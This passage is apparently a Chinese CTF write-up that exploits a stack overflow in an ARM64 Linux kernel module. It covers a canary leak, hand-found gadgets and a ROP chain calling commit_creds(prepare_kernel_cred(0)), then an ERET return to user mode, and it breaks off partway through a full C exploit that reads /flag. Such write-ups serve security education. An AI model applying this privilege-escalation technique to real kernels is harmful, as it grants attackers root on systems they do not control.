<li>那前面的 <code>_ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0))</code> 就是用来生成 canary 的</li>
</ul>
<p>然后就到了我感觉最抽象的一段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">0x2C</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">  || (v19 = *(_QWORD *)StatusReg, v8 = (<span class="keyword">unsigned</span> __int64)buf, (v19 &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int64)buf &amp; ((__int64)((_QWORD)buf &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v9 = <span class="number">0xFFFFFFFFFFFF</span>LL;</span><br><span class="line">_CF = __CFADD__(v8, len);</span><br><span class="line">v11 = v8 + len;</span><br><span class="line"><span class="keyword">if</span> ( v11 != <span class="number">0</span> &amp;&amp; _CF )</span><br><span class="line">  v9 = <span class="number">0LL</span>;                                   <span class="comment">// △</span></span><br><span class="line"><span class="keyword">if</span> ( _CF )</span><br><span class="line">  v11 = <span class="number">-1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( (v11 != v9 + !_CF) &amp; __CFSUB__(v11, v9, _CF) )</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">else</span>                                          <span class="comment">// △</span></span><br><span class="line">  v12 = <span class="number">1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( v12 )                                    <span class="comment">// △</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int64)buf &amp; ((__int64)((_QWORD)buf &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFFFF000000000000</span>LL) != <span class="number">0</span> )</span><br><span class="line">    v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = buf;</span><br><span class="line">  __asm &#123; HINT            #<span class="number">0x14</span> &#125;</span><br><span class="line">  v17 = _arch_copy_from_user(demo_buf, v13, len);<span class="comment">// 成功返回&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v17 )                                    <span class="comment">// △</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;demo_buf[len - v17], <span class="number">0</span>, v17);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;                <span class="comment">// 返回错误码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  _memcpy(tmp, demo_buf);</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>demo_buf</code> 的范围远比 <code>tmp</code> 大，因此有栈溢出</li>
</ul>
<p>这段代码有很多未命名变量，宏定义，还有很多 if-else 语句，但我们可以从后向前分析：</p>
<ul>
<li>为了不让程序返回错误码 0xFFFFFFFFFFFFFFEALL，以上各个 if-else 语句都只能按照 “△” 标注的路线回溯</li>
<li>直到第一个 if 执行：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">0x2C</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">    || (v19 = *(_QWORD *)StatusReg, </span><br><span class="line">        v8 = (<span class="keyword">unsigned</span> __int64)buf, </span><br><span class="line">        (v19 &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br></pre></td></tr></table></figure>
<p>感觉程序在检查一些环境，没有实质性的操作，写一个 test.c 进行调试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_sp_v;</span><br><span class="line"><span class="keyword">size_t</span> *user_sp = &amp;user_sp_v;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/demo&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以通过 <code>/sys/module/demo/sections/.text</code> 获取模块 <code>.text</code> 基地址</li>
</ul>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/home/</span>pwn # cat <span class="regexp">/sys/m</span>odule<span class="regexp">/demo/</span>sections/.text</span><br><span class="line"><span class="number">0</span>xffffbcf41c9e3000</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0xffffbe24d4559090</span>    bl     #<span class="number">0xffffbe24da88b200</span>           &lt;<span class="number">0xffffbe24da88b200</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0xffffbe24da88b200</span>    hint   #<span class="number">0x22</span></span><br><span class="line">  <span class="number">0xffffbe24da88b204</span>    add    x5, x0, x2</span><br><span class="line">  <span class="number">0xffffbe24da88b208</span>    mov    x15, x1</span><br><span class="line">  <span class="number">0xffffbe24da88b20c</span>    mov    x6, x0</span><br><span class="line">  <span class="number">0xffffbe24da88b210</span>    cmp    x2, #<span class="number">0x10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其实到 <code>_arch_copy_from_user(demo_buf, v13, len)</code> 执行之前的操作都没有什么影响，可以直接忽略</li>
</ul>
<p>函数 <code>device_read</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">canary = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) + <span class="number">0x480</span>);</span><br><span class="line"><span class="keyword">if</span> ( length &gt; <span class="number">0x1000</span> )</span><br><span class="line">  <span class="keyword">return</span> device_read_0((file *)length, buffer, length, <span class="number">0LL</span>);</span><br><span class="line">_memcpy(demo_buf, tmp);</span><br><span class="line">StatusReg = _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">44</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">  || (v7 = (<span class="keyword">unsigned</span> __int64)buffer, (*(_QWORD *)StatusReg &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int64)buffer &amp; ((__int64)((_QWORD)buffer &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v8 = <span class="number">0xFFFFFFFFFFFF</span>LL;</span><br><span class="line">_CF = __CFADD__(v7, length);</span><br><span class="line">v10 = v7 + length;</span><br><span class="line"><span class="keyword">if</span> ( v10 != <span class="number">0</span> &amp;&amp; _CF )</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( _CF )</span><br><span class="line">  v10 = <span class="number">-1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( (v10 != v8 + !_CF) &amp; __CFSUB__(v10, v8, _CF) )</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v11 = <span class="number">1LL</span>;</span><br><span class="line">v12 = length;</span><br><span class="line"><span class="keyword">if</span> ( v11 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int64)buffer &amp; ((__int64)((_QWORD)buffer &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFFFF000000000000</span>LL) != <span class="number">0</span> )</span><br><span class="line">    v15 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v15 = buffer;</span><br><span class="line">  __asm &#123; HINT            #<span class="number">0x14</span> &#125;</span><br><span class="line">  v12 = _arch_copy_to_user(v15, demo_buf, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>由于 tmp 和 canary 靠得很近，这里可以把 canary 拷贝到 demo_buf 中</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>栈溢出和泄露 canary 都很简单，关键是怎么提取并且回到用户态</p>
<p>程序开了 smep 因此只能写 ROP，第一个 gadget 需要完成栈迁移的工作</p>
<p>常规获取 gadget 的工具 ropper/ROPgadget 不能使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filebytes.binary.BinaryError: Bad architecture</span><br><span class="line">ropper --file ./Image --nocolor &gt; g1  <span class="number">0.40</span>s user <span class="number">0.09</span>s system <span class="number">99</span>% cpu <span class="number">0.491</span> total</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Error] PE.getArch() - Bad Arch</span><br></pre></td></tr></table></figure>
<ul>
<li>这就需要手动找 Gadget 了</li>
</ul>
<p>内核里有个好用的 gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000016950 00 00 80 52                   MOV             W0, #0</span><br><span class="line">.text:0000000000016954 F3 53 41 A9                   LDP             X19, X20, [SP,#0x50+var_40]</span><br><span class="line">.text:0000000000016958 F5 5B 42 A9                   LDP             X21, X22, [SP,#0x50+var_30]</span><br><span class="line">.text:000000000001695C F7 63 43 A9                   LDP             X23, X24, [SP,#0x50+var_20]</span><br><span class="line">.text:0000000000016960 F9 23 40 F9                   LDR             X25, [SP,#0x50+var_10]</span><br><span class="line">.text:0000000000016964 FD 7B C5 A8                   LDP             X29, X30, [SP+0x50+var_50],#0x50</span><br><span class="line">.text:0000000000016968 C0 03 5F D6                   RET</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里有一个小坑需要注意：ARM 的 ret 指令和 x86 的有很大不同</p>
<ul>
<li>执行 ret 之后，会把 LR 寄存器里的值赋值给 PC（注意，不是栈）</li>
</ul>
<p>因此构造 ROP 链时的核心就是通过栈来控制 LR(X30) 寄存器：</p>
<ul>
<li>控制 X19 为 <code>prepare_kernel_cred+4</code></li>
<li>控制 X30 为 <code>commit_creds+4</code></li>
<li>执行 ret 时就可以执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
</ul>
<p>后续需要考虑返回用户态的问题：</p>
<p>ARM64使用 <code>SVC</code> 指令进入内核态，使用 <code>ERET</code> 指令返回用户态，ARM 在进入内核态之前会保存用户态所有寄存器状态，在返回时恢复</p>
<p>其中比较重要的寄存器有 SP_EL0、ELR_EL1、SPSR_EL1：</p>
<ul>
<li>SP_EL0：保存用户态的栈指针</li>
<li>ELR_EL1：保存要返回的用户态 PC 指针</li>
<li>SPSR_EL1：保存 0x80001000</li>
</ul>
<p>可以用下面这个 gadget 来填充上述数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000011F</span>E4 <span class="number">17</span> <span class="number">41</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c1, #<span class="number">0</span>, X23 <span class="comment">/* msr	sp_el0, x23 */</span></span><br><span class="line">.text:<span class="number">0000000000011F</span>E8 DF <span class="number">02</span> <span class="number">7</span>C F2                   TST             X22, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000011F</span>EC <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">54</span>                   B.EQ            loc_11FF4</span><br><span class="line">.text:<span class="number">0000000000011F</span>EC</span><br><span class="line">.text:<span class="number">0000000000011F</span>F0 <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">0000000000011F</span>F0</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4                               loc_11FF4                               ; CODE XREF: sub_157D0<span class="number">-37E4</span>↑j</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4 <span class="number">80</span> B7 <span class="number">46</span> F9                   LDR             X0, [X28,#<span class="number">0xD68</span>]</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8 <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span>                   B               loc_12024</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8                               ; END OF FUNCTION CHUNK FOR sub_157D0</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               ; FUNCTION CHUNK AT .text:<span class="number">0000000000012024</span> SIZE <span class="number">00000050</span> BYTES</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC C1 BF <span class="number">00</span> D0 <span class="number">21</span> A0 <span class="number">00</span> <span class="number">91</span>       ADRL            X1, unk_180B028</span><br><span class="line">.text:<span class="number">0000000000012004</span> <span class="number">80</span> D0 <span class="number">38</span> D5                   MRS             X0, #<span class="number">0</span>, c13, c0, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">0000000000012008</span> <span class="number">21</span> <span class="number">68</span> <span class="number">60</span> F8                   LDR             X1, [X1,X0]</span><br><span class="line">.text:<span class="number">000000000001200</span>C C1 <span class="number">00</span> <span class="number">00</span> B4                   CBZ             X1, loc_12024</span><br><span class="line">.text:<span class="number">000000000001200</span>C</span><br><span class="line">.text:<span class="number">0000000000012010</span> <span class="number">81</span> <span class="number">03</span> <span class="number">40</span> F9                   LDR             X1, [X28]</span><br><span class="line">.text:<span class="number">0000000000012014</span> <span class="number">81</span> <span class="number">00</span> C8 <span class="number">37</span>                   TBNZ            W1, #<span class="number">0x19</span>, loc_12024</span><br><span class="line">.text:<span class="number">0000000000012014</span></span><br><span class="line">.text:<span class="number">0000000000012018</span> E0 <span class="number">3F</span> <span class="number">01</span> <span class="number">32</span>                   MOV             W0, #<span class="number">0x80007FFF</span></span><br><span class="line">.text:<span class="number">000000000001201</span>C <span class="number">01</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W1, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000012020</span> <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">0000000000012020</span></span><br><span class="line">.text:<span class="number">0000000000012020</span>                               ; End of function sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000012020</span></span><br><span class="line">.text:<span class="number">0000000000012024</span>                               ; START OF FUNCTION CHUNK FOR sub_157D0</span><br><span class="line">.text:<span class="number">0000000000012024</span>                               ;   ADDITIONAL PARENT FUNCTION sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000012024</span></span><br><span class="line">.text:<span class="number">0000000000012024</span>                               loc_12024                               ; CODE XREF: sub_157D0<span class="number">-37</span>D8↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span>                                                                       ; sub_11FFC+<span class="number">10</span>↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span>                                                                       ; sub_11FFC+<span class="number">18</span>↑j</span><br><span class="line">.text:<span class="number">0000000000012024</span> <span class="number">35</span> <span class="number">40</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c0, #<span class="number">1</span>, X21 <span class="comment">/* msr	elr_el1, x21 */</span></span><br><span class="line">.text:<span class="number">0000000000012028</span> <span class="number">16</span> <span class="number">40</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c0, #<span class="number">0</span>, X22 <span class="comment">/* msr	spsr_el1, x22 */</span></span><br><span class="line">.text:<span class="number">000000000001202</span>C E0 <span class="number">07</span> <span class="number">40</span> A9                   LDP             X0, X1, [SP,#arg_0]</span><br><span class="line">.text:<span class="number">0000000000012030</span> E2 <span class="number">0F</span> <span class="number">41</span> A9                   LDP             X2, X3, [SP,#arg_10]</span><br><span class="line">.text:<span class="number">0000000000012034</span> E4 <span class="number">17</span> <span class="number">42</span> A9                   LDP             X4, X5, [SP,#arg_20]</span><br><span class="line">.text:<span class="number">0000000000012038</span> E6 <span class="number">1F</span> <span class="number">43</span> A9                   LDP             X6, X7, [SP,#arg_30]</span><br><span class="line">.text:<span class="number">000000000001203</span>C E8 <span class="number">27</span> <span class="number">44</span> A9                   LDP             X8, X9, [SP,#arg_40]</span><br><span class="line">.text:<span class="number">0000000000012040</span> EA <span class="number">2F</span> <span class="number">45</span> A9                   LDP             X10, X11, [SP,#arg_50]</span><br><span class="line">.text:<span class="number">0000000000012044</span> EC <span class="number">37</span> <span class="number">46</span> A9                   LDP             X12, X13, [SP,#arg_60]</span><br><span class="line">.text:<span class="number">0000000000012048</span> EE <span class="number">3F</span> <span class="number">47</span> A9                   LDP             X14, X15, [SP,#arg_70]</span><br><span class="line">.text:<span class="number">000000000001204</span>C F0 <span class="number">47</span> <span class="number">48</span> A9                   LDP             X16, X17, [SP,#arg_80]</span><br><span class="line">.text:<span class="number">0000000000012050</span> F2 <span class="number">4F</span> <span class="number">49</span> A9                   LDP             X18, X19, [SP,#arg_90]</span><br><span class="line">.text:<span class="number">0000000000012054</span> F4 <span class="number">57</span> <span class="number">4</span>A A9                   LDP             X20, X21, [SP,#arg_A0]</span><br><span class="line">.text:<span class="number">0000000000012058</span> F6 <span class="number">5F</span> <span class="number">4B</span> A9                   LDP             X22, X23, [SP,#arg_B0]</span><br><span class="line">.text:<span class="number">000000000001205</span>C F8 <span class="number">67</span> <span class="number">4</span>C A9                   LDP             X24, X25, [SP,#arg_C0]</span><br><span class="line">.text:<span class="number">0000000000012060</span> FA <span class="number">6F</span> <span class="number">4</span>D A9                   LDP             X26, X27, [SP,#arg_D0]</span><br><span class="line">.text:<span class="number">0000000000012064</span> FC <span class="number">77</span> <span class="number">4</span>E A9                   LDP             X28, X29, [SP,#arg_E0]</span><br><span class="line">.text:<span class="number">0000000000012068</span> FE <span class="number">7B</span> <span class="number">40</span> F9                   LDR             X30, [SP,#arg_F0]</span><br><span class="line">.text:<span class="number">000000000001206</span>C FF <span class="number">43</span> <span class="number">05</span> <span class="number">91</span>                   ADD             SP, SP, #<span class="number">0x150</span></span><br><span class="line">.text:<span class="number">0000000000012070</span> E0 <span class="number">03</span> <span class="number">9F</span> D6                   ERET</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后需要注意：不能执行 <code>system(&quot;/bin/sh&quot;)</code>，会触发缺页机制 </p>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_sp_v;</span><br><span class="line"><span class="keyword">size_t</span> *user_sp = &amp;user_sp_v;</span><br><span class="line"><span class="keyword">char</span>* tmpbuf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> canary;</span><br><span class="line"><span class="keyword">size_t</span> kernel_addr;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base;</span><br><span class="line"><span class="keyword">size_t</span> offset;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffff8000080a2258</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffff8000080a24f8</span>;</span><br><span class="line"><span class="keyword">size_t</span> gadget1 = <span class="number">0xffff800008011fe4</span>;</span><br><span class="line"><span class="keyword">size_t</span> gadget2 = <span class="number">0xffff800008016950</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x11, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (user_sp));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x12, sp&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;str x12, [x11]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov x11, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (user_sp));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;ldr x12, [x11]&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov sp, x12&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, tmpbuf, <span class="number">0x40</span>);</span><br><span class="line">    write(<span class="number">1</span>, tmpbuf, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/demo&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    read(fd, buf, <span 